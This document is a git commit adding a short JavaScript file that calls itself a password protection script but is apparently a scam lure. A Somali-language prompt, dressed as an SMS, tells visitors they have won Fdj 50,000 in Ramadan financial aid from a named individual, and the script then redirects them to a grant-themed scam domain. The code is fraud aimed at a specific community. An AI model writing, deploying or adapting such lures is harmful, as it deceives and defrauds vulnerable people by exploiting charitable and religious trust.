52c56cbd00c57b4f7d4dabcfd5374711093aa690
The-ongoing <preciousadaowo4@gmail.com>
2026-03-10 20:05:23 +0100

    Create activeddj.js

---
+++ activeddj.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'Kala bax Fdj50,000'
+password = prompt(
+  'SMS: Hambalyo! Waxaad u qalantaa inaad hesho ABDOURAHMAN BOREH Fdj 50,000 KAALMADA LACAGTA RAMADAAN. Fadlan riix OK si aad u hesho isla markiiba.',
+  'Kala bax Fdj50,000'
+);
+if (password != 'Kala bax Fdj50,000') {
+  location.href = 'https://ongoing-grant.cfd/50000-Taageerada-Ramadaanka.html';
+  }
